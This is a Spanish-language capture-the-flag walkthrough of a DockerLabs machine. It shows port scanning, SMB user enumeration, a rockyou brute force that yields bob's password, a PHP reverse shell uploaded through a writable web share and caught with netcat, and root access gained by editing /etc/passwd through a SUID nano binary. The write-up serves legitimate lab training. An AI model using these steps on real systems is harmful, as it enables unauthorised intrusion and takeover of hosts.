---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `SQLi` `XXE` `Bypass` `Python` `Sudoers` `Croc`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip domain.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh domain.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p80,139,445 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 16:22 +0100
Nmap scan report for 172.17.0.2
Host is up (0.000027s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-18T15:22:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds
```

Identificamos los puertos `80`, `139` y `445` abiertos.

Accedemos al puerto `80` pero no encontramos nada interesante en la web.

## ENUMERACIÓN SMB

Pasamos a enumerar el servicio `Samba` utilizando la herramienta `enum4linux`.

```Bash
enum4linux -a 172.17.0.2
```

Info:
```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 18 16:23:13 2026

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james	Name: james	Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob	Name: bob	Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]

 ==================================( Share Enumeration on 172.17.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	html            Disk      HTML Share
	IPC$            IPC       IPC Service (f07649f444cc server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2

//172.17.0.2/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/html	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//172.17.0.2/IPC$	Mapping: N/A Listing: N/A Writing: N/A


[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\bob (Local User)
S-1-22-1-1001 Unix User\james (Local User)

[+] Enumerating users using SID S-1-5-21-2216802010-1871323555-2834606363 and logon username '', password ''

S-1-5-21-2216802010-1871323555-2834606363-501 F07649F444CC\nobody (Local User)
S-1-5-21-2216802010-1871323555-2834606363-513 F07649F444CC\None (Domain Group)
S-1-5-21-2216802010-1871323555-2834606363-1000 F07649F444CC\james (Local User)
S-1-5-21-2216802010-1871323555-2834606363-1001 F07649F444CC\bob (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ================================( Getting printer info for 172.17.0.2 )================================

No printers returned.


enum4linux complete on Wed Feb 18 16:23:49 2026
```

Gracias a la enumeración vemos que existen los usuarios `james` y `bob` .

Intentamos acceder a las `shares` con `null session` y con el usuario `guest` sin éxito, por lo que intentamos un ataque de `fuerza bruta` contra el servicio `SMB` con el usuario `bob` utilizando `NetExec`.

```Bash
netexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

Info:
```
--------------------------------<MORE_OUTPUT>-----------------------------------

SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:marta STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:jomar STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:hamtaro STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:fuckface STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:erwin STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:dudley STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:chris12 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:bighead STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:s123456 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:nicole2 STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:mercado STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:mango STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:ilovekyle STATUS_LOGON_FAILURE
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:godlovesme STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:garnet STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [-] F07649F444CC\bob:brendon STATUS_LOGON_FAILURE 
SMB         172.17.0.2      445    F07649F444CC     [+] F07649F444CC\bob:star
```

Encontramos credenciales válidas para el usuario `bob` : `star`.

Enumeramos las `shares` disponibles utilizando el usuario y contraseña obtenidos.

```Bash
netexec smb 172.17.0.2 -u bob -p 'star' --shares
```

Info:
```
SMB         172.17.0.2      445    F07649F444CC     [*] Unix - Samba (name:F07649F444CC) (domain:F07649F444CC) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    F07649F444CC     [+] F07649F444CC\bob:star 
SMB         172.17.0.2      445    F07649F444CC     [*] Enumerated shares
SMB         172.17.0.2      445    F07649F444CC     Share           Permissions     Remark
SMB         172.17.0.2      445    F07649F444CC     -----           -----------     ------
SMB         172.17.0.2      445    F07649F444CC     print$          READ            Printer Drivers
SMB         172.17.0.2      445    F07649F444CC     html            READ,WRITE      HTML Share
SMB         172.17.0.2      445    F07649F444CC     IPC$                            IPC Service (f07649f444cc server (Samba, Ubuntu))
```

Vemos que tenemos permisos de escritura `READ,WRITE` sobre la share `html`. Nos conectamos a ella mediante `smbclient`.

```Bash
smbclient //172.17.0.2/html -U bob -p
```

```
smb: \> ls
  .                                   D        0  Wed Feb 18 16:31:05 2026
  ..                                  D        0  Thu Apr 11 10:18:47 2024
  index.html                          N     1832  Thu Apr 11 10:21:43 2024

		98497780 blocks of size 1024. 56393620 blocks available
smb: \>
```

Entramos y vemos que el recurso compartido es el directorio accesible por el puerto `80`.

Vamos a subir una `reverse shell` a este recurso compartido, para luego acceder desde el navegador y recibir la conexión. 

Utilizaremos la shell en `PHP` de `Pentestmonkey`.

```
smb: \> put shell.php 
putting file shell.php as \shell.php (36.1 kB/s) (average 36.1 kB/s)
```

Ponemos un `listener` en nuestra máquina atacante.

```Bash
sudo nc -nlvp 4444
```

Accedemos mediante el navegador al archivo subido.

```
http://172.17.0.2/shell.php
```

Info:
```
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39240
whoami
www-data
```

Recibimos la shell como el usuario `www-data`.

## TTY

Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:

```bash
script /dev/null -c bash
```

`ctrl Z`

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```Bash
find / -perm -4000 -type f 2>/dev/null
```

Info:
```
/usr/bin/umount
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/nano
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Observamos que el binario `nano` tiene permisos `SUID`. Esto nos permitirá editar archivos del sistema con privilegios de `root`.

Aprovecharemos esto para modificar el archivo `/etc/passwd`. 

Primero, generamos un `hash` compatible para una nueva contraseña.

```Bash
openssl passwd -1 password1
```

```
$1$R8oMRd5g$vT8ih0X89h.L7aSVYVje6.
```

Editamos el archivo `/etc/passwd`.

```Bash
nano /etc/passwd
```

Dentro de `/etc/passwd` sustituimos la `x` en la línea del usuario root `root:x:0:0...` por el `hash` que hemos generado.

De esta manera, `password1` pasará a ser su contraseña. 

Guardamos los cambios y procedemos a autenticarnos como `root`.

```Bash
su root
# password: password1
```

```
root@f07649f444cc:/# whoami
root
root@f07649f444cc:/#
```

Ya somos root!
